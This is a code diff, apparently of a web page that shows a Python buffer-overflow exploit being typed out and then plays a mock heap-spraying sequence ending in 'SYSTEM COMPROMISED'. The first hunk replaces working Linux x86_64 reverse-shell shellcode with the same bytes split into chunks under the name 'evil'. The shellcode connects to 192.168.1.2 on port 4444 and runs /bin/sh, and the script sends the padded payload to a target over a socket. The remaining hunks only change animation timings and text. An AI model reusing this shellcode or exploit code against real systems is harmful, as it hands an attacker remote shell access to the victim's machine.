@@ -34,8 +34,17 @@ payload = b"A" * offset + ret_addr + b"\\x90" * 32
 
 # Constructing shellcode
 # This is a simple reverse shell execve("/bin/sh") shellcode for Linux x86_64 from https://www.exploit-db.com/shellcodes/42485 by Touhid Shaikh
-shellcode = b"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x29\\x48\\x31\\xff\\x48\\x89\\xfa\\x48\\x83\\xc7\\x02\\x48\\x31\\xf6\\x48\\x83\\xc6\\x01\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x48\\x83\\xc0\\x02\\xc7\\x44\\x24\\xfc\\xc0\\xa8\\x01\\x02\\x66\\xc7\\x44\\x24\\xfa\\x11\\x5c\\x66\\x89\\x44\\x24\\xf8\\x48\\x83\\xec\\x08\\x48\\x83\\xc0\\x28\\x48\\x89\\xe6\\x48\\x31\\xd2\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc6\\x48\\x83\\xc0\\x21\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x48\\x83\\xc6\\x01\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x48\\x83\\xc6\\x02\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05"
-payload += shellcode
+evil = b"\\x48\\x31\\xc0\\x48\\x83\\xc0\\x29\\x48\\x31\\xff\\x48\\x89\\xfa\\x48\\x83\\xc7\\x02"
+evil = evil + b"\\x48\\x31\\xf6\\x48\\x83\\xc6\\x01\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\x50\\x48"
+evil = evil + b"\\x83\\xc0\\x02\\xc7\\x44\\x24\\xfc\\xc0\\xa8\\x01\\x02\\x66\\xc7\\x44\\x24\\xfa\\x11"
+evil = evil + b"\\x5c\\x66\\x89\\x44\\x24\\xf8\\x48\\x83\\xec\\x08\\x48\\x83\\xc0\\x28\\x48\\x89\\xe6"
+evil = evil + b"\\x48\\x31\\xd2\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc6\\x48\\x83"
+evil = evil + b"\\xc0\\x21\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x48\\x83\\xc6"
+evil = evil + b"\\x01\\x0f\\x05\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x48\\x31\\xf6\\x48\\x83\\xc6\\x02"
+evil = evil + b"\\x0f\\x05\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53"
+evil = evil + b"\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05"
+
+payload += evil
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((target_ip, port))
@@ -71,9 +80,9 @@ print("[+] Payload delivered. Exploiting memory...")
             window.scrollTo(0, document.body.scrollHeight);
 
             if (index < exploitCode.length) {
-                setTimeout(typeCode, 30); // Speed of typing
+                setTimeout(typeCode, 40); // Speed of typing
             } else {
-                setTimeout(startExecution, 800); // Pause before executing
+                setTimeout(startExecution, 500); // Pause before executing
             }
         }
 
@@ -86,7 +95,7 @@ print("[+] Payload delivered. Exploiting memory...")
             screen.innerHTML += "[*] Spraying heap memory...\n";
 
             let attempts = 0;
-            let maxAttempts = 35; // How many memory addresses to try before succeeding
+            let maxAttempts = 11; // How many memory addresses to try before succeeding
 
             let exploitInterval = setInterval(() => {
                 if (!isHacking) {
@@ -111,7 +120,7 @@ print("[+] Payload delivered. Exploiting memory...")
                     setTimeout(() => {
                         screen.innerHTML += `
                             <div class='animate-pulse text-xl md:text-3xl font-bold text-red-500 mt-8 text-center border-4 border-red-500 p-6 w-full md:w-3/4 mx-auto bg-red-900/20 shadow-[0_0_50px_rgba(255,0,0,0.5)]'>
-                                [!] SYSTEM COMPROMISED.<br>ROOT ACCESS GRANTED.
+                                [!] SYSTEM COMPROMISED. ROOT ACCESS GRANTED.
                             </div>`;
                         window.scrollTo(0, document.body.scrollHeight);
                     }, 1000);
